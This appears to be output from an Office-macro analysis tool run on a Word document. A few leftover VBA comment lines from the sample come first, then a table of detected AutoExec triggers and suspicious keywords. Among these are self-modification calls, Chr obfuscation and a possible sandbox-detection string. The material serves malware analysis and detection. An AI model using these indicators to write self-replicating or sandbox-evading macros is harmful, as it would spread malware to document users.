' KZ, Kostanai, KGU EMF Applied Mathematics
' 15:46:07 - ïîíåäåëüíèê, 7 ìàé 2001
' õõ
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 18:10:36 - ÷åòâåðã, 10 ìàé 2001
' User
'



' * DSR & FHS , KGU EMF
' 00:15:54  -  Wednesday, 22.12.1999
' KZ, Kostanai, KGU EMF Applied Mathematics
' 12:33:20 - âòîðíèê, 15 ìàé 2001
' andy
'



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|andy                |May detect Anubis Sandbox                    |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

